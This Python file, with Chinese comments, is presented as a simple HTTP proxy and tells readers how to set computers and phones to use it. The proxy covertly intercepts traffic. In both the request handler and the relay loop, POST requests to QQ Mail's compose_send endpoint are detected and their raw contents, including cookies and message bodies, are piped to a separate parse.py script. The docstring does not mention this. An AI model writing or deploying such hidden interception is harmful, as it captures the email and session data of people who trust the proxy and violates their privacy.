"""
    一个简单的HTTP代理
    参数说明:
        -h, --host 指定代理主机地址，默认获取本机地址，代表本机任意ipv4地址
        -p, --port 指定代理主机端口，默认随机生成一个运行代码主机的闲置端口
        -l, --listen 指定监听客户端数量，默认10
        -b, --bufsize 指定数据传输缓冲区大小，值为整型，单位kb，默认8
        -d, --delay 指定数据转发延迟，值为浮点型，单位ms，默认1
    简单使用:
        # 启动服务
        [wcx@localhost ~]$ python simple_http_proxy.py --bufsize 64
        [info] bind=0.0.0.0:8080
        [info] listen=10
        [info] bufsize=64kb, delay=1ms
        # 注：Linux查看本机IP地址的命令为 ifconfig，Windows为ipconfig
    客户端:
        电脑：打开网络和Internet设置 -> 代理 -> 手动设置代理 -> 配置代理服务器IP和端口号
        手机：选择一个已连接的WIFI，修改该网络 -> 显示高级选项 -> 手动设置代理 -> 配置代理服务器IP和端口号
"""
import sys
import getopt
import os
import random
import socket
import select
import time
import psutil
import _thread as thread
import subprocess
 
 
def debug(tag, msg):
    print('[%s] %s' % (tag, msg))


def launch_parser(pack_data):
    print("\033[0;36mWebmail packet detected!\033[0m")
    process = subprocess.Popen(["python", "parse.py"], stdin=subprocess.PIPE)
    process.stdin.write(pack_data + b'\r\n')
    process.stdin.close()
 
 
class NetInfo(object):
 
    @staticmethod
    def get_port():
        """
        Gets the free port in the specified range
        :return: Available ports
        """
        net_cmd = "netstat -ntl |grep -v Active| grep -v Proto|awk '{print $4}'|awk -F: '{print $NF}'"
        port_list = os.popen(net_cmd).read().split("\n")
        port = random.randint(1024, 65535)
        if port not in port_list:
            return port
        else:
            NetInfo.get_port()
 
    @staticmethod
    def get_net_card():
        """Get the network card Ming and IP
        """
        card_list = []
        for card, values in psutil.net_if_addrs().items():
            if card == "lo":
                continue
            address = ""
            for key in values:
                if key.family == 2:
                    address = key.address
            if address == "":
                continue
            card_list.append(card + "-" + address)
        return card_list
 
    @staticmethod
    def get_local_ips():
        """Get all IP of the machine, not including 127.0.0.1"""
        res = [
            item[1]
            for k, v in psutil.net_if_addrs().items()
            for item in v
            if item[0] == 2
        ]
        if "127.0.0.1" in res:
            res.remove("127.0.0.1")
        return res[0]
 
 
class HttpRequestPacket(object):
    """
    HTTP请求包
    """
 
    def __init__(self, data):
        self.__parse(data)
 
    def __parse(self, data):
        """
        解析一个HTTP请求数据包
        GET http://test.wengcx.top/index.html HTTP/1.1\r\nHost: test.wengcx.top\r\nProxy-Connection: keep-alive\r\nCache-Control: max-age=0\r\n\r\n
        参数：data 原始数据
        """
        i0 = data.find(b'\r\n')  # 请求行与请求头的分隔位置
        i1 = data.find(b'\r\n\r\n')  # 请求头与请求数据的分隔位置
 
        # 请求行 Request-Line
        self.req_line = data[:i0]
        self.method, self.req_uri, self.version = self.req_line.split()  # 请求行由method、request uri、version组成
        # print(self.method, self.req_uri, self.version)
 
        # 请求头域 Request Header Fields
        self.req_header = data[i0 + 2:i1]
        self.headers = {}
        for header in self.req_header.split(b'\r\n'):
            k, v = header.split(b': ')
            self.headers[k] = v
        self.host = self.headers.get(b'Host')
 
        # 请求数据
        self.req_data = data[i1 + 4:]
 
 
class SimpleHttpProxy(object):
    """
    简单的HTTP代理
    客户端(client) <=> 代理端(proxy) <=> 服务端(server)
    """
 
    def __init__(self, host='0.0.0.0', port=8080, listen=10, bufsize=8, delay=1):
        """
        初始化代理套接字，用于与客户端、服务端通信
        参数：host 监听地址，默认0.0.0.0，代表本机任意ipv4地址
        参数：port 监听端口，默认8080
        参数：listen 监听客户端数量，默认10
        参数：bufsize 数据传输缓冲区大小，单位kb，默认8kb
        参数：delay 数据转发延迟，单位ms，默认1ms
        """
        self.socket_proxy = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket_proxy.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,
                                     1)  # 将SO_REUSEADDR标记为True, 当socket关闭后，立刻回收该socket的端口
        self.socket_proxy.bind((host, port))
        self.socket_proxy.listen(listen)
 
        self.socket_recv_bufsize = bufsize * 1024
        self.delay = delay / 1000.0
 
        debug('info', 'bind=%s:%s' % (host, port))
        debug('info', 'listen=%s' % listen)
        debug('info', 'bufsize=%skb, delay=%sms' % (bufsize, delay))
 
    def __del__(self):
        self.socket_proxy.close()
 
    def __connect(self, host, port):
        """
        解析DNS得到套接字地址并与之建立连接
        参数：host 主机
        参数：port 端口
        返回：与目标主机建立连接的套接字
        """
        # 解析DNS获取对应协议簇、socket类型、目标地址
        # getaddrinfo -> [(family, sockettype, proto, canonname, target_addr),]
        (family, sockettype, _, _, target_addr) = socket.getaddrinfo(host, port)[0]
 
        tmp_socket = socket.socket(family, sockettype)
        tmp_socket.setblocking(0)
        tmp_socket.settimeout(5)
        tmp_socket.connect(target_addr)
        return tmp_socket
 
    def __proxy(self, socket_client):
        """
        代理核心程序
        参数：socket_client 代理端与客户端之间建立的套接字
        """
        # 接收客户端请求数据
        req_data = socket_client.recv(self.socket_recv_bufsize)
        if req_data == b'':
            return

        # print(f"\n{req_data}")

        # 解析http请求数据
        http_packet = HttpRequestPacket(req_data)
 
        # 获取服务端host、port
        if b':' in http_packet.host:
            server_host, server_port = http_packet.host.split(b':')
        else:
            server_host, server_port = http_packet.host, 80
 
        # # 修正http请求数据
        # tmp = b'%s//%s' % (http_packet.req_uri.split(b'//')[0], http_packet.host)
        # req_data = req_data.replace(tmp, b'')
        if http_packet.method == b'POST' and http_packet.req_uri.startswith(b'http://mail.qq.com/cgi-bin/compose_send'):
            # print(f"\n{req_data}")
            launch_parser(req_data)
 
        # HTTP
        if http_packet.method in [b'GET', b'POST', b'PUT', b'DELETE', b'HEAD']:
            socket_server = self.__connect(server_host, server_port)  # 建立连接
            socket_server.send(req_data)  # 将客户端请求数据发给服务端
 
        # HTTPS，会先通过CONNECT方法建立TCP连接
        elif http_packet.method == b'CONNECT':
            socket_server = self.__connect(server_host, server_port)  # 建立连接
 
            success_msg = b'%s %d Connection Established\r\nConnection: close\r\n\r\n' \
                          % (http_packet.version, 200)
            socket_client.send(success_msg)  # 完成连接，通知客户端
 
            # 客户端得知连接建立，会将真实请求数据发送给代理服务端
            req_data = socket_client.recv(self.socket_recv_bufsize)  # 接收客户端真实数据
            socket_server.send(req_data)  # 将客户端真实请求数据发给服务端
 
        # 使用select异步处理，不阻塞
        self.__nonblocking(socket_client, socket_server)
 
    def __nonblocking(self, socket_client, socket_server):
        """
        使用select实现异步处理数据
        参数：socket_client 代理端与客户端之间建立的套接字
        参数：socket_server 代理端与服务端之间建立的套接字
        """
        _rlist = [socket_client, socket_server]
        is_recv = True
        while is_recv:
            try:
                # rlist, wlist, elist = select.select(_rlist, _wlist, _elist, [timeout])
                # 参数1：当列表_rlist中的文件描述符fd状态为readable时，fd将被添加到rlist中
                # 参数2：当列表_wlist中存在文件描述符fd时，fd将被添加到wlist
                # 参数3：当列表_xlist中的文件描述符fd发生错误时，fd将被添加到elist
                # 参数4：超时时间timeout
                #  1) 当timeout==None时，select将一直阻塞，直到监听的文件描述符fd发生变化时返回
                #  2) 当timeout==0时，select不会阻塞，无论文件描述符fd是否有变化，都立刻返回
                #  3) 当timeout>0时，若文件描述符fd无变化，select将被阻塞timeout秒再返回
                rlist, _, elist = select.select(_rlist, [], [], 2)
                if elist:
                    break
                for tmp_socket in rlist:
                    is_recv = True
                    # 接收数据
                    data = tmp_socket.recv(self.socket_recv_bufsize)
                    if data == b'':
                        is_recv = False
                        continue
 
                    # socket_client状态为readable, 当前接收的数据来自客户端
                    if tmp_socket is socket_client:
                        socket_server.send(data)  # 将客户端请求数据发往服务端
                        # print(f'\n{data}')
                        if data.startswith(b'POST http://mail.qq.com/cgi-bin/compose_send'):
                            launch_parser(data)

                        # debug('proxy', 'client -> server')
 
                    # socket_server状态为readable, 当前接收的数据来自服务端
                    elif tmp_socket is socket_server:
                        socket_client.send(data)  # 将服务端响应数据发往客户端
                        # debug('proxy', 'client <- server')
 
                time.sleep(self.delay)  # 适当延迟以降低CPU占用
            except Exception as e:
                break
 
        socket_client.close()
        socket_server.close()
 
    def client_socket_accept(self):
        """
        获取已经与代理端建立连接的客户端套接字，如无则阻塞，直到可以获取一个建立连接套接字
        返回：socket_client 代理端与客户端之间建立的套接字
        """
        socket_client, _ = self.socket_proxy.accept()
        return socket_client
 
    def handle_client_request(self, socket_client):
        try:
            self.__proxy(socket_client)
        except:
            pass
 
    def start(self):
        while True:
            try:
                # self.handle_client_request(self.client_socket_accept())
                thread.start_new_thread(self.handle_client_request, (self.client_socket_accept(),))
            except KeyboardInterrupt:
                break
 
 
if __name__ == '__main__':
    # 默认参数
    host, port, listen, bufsize, delay = '0.0.0.0', 8080, 16, 8, 1
    try:
        opts, _ = getopt.getopt(sys.argv[1:], 'h:p:l:b:d:', ['host=', 'port=', 'listen=', 'bufsize=', 'delay='])
        for opt, arg in opts:
            if opt in ('-h', '--host'):
                host = arg
            elif opt in ('-p', '--port'):
                port = int(arg)
            elif opt in ('-l', '--listen'):
                listen = int(arg)
            elif opt in ('-b', '--bufsize'):
                bufsize = int(arg)
            elif opt in ('-d', '--delay'):
                delay = float(arg)
    except:
        debug('error', 'read the readme.md first!')
        sys.exit()
 
    # 启动代理
    SimpleHttpProxy(host, port, listen, bufsize, delay).start()
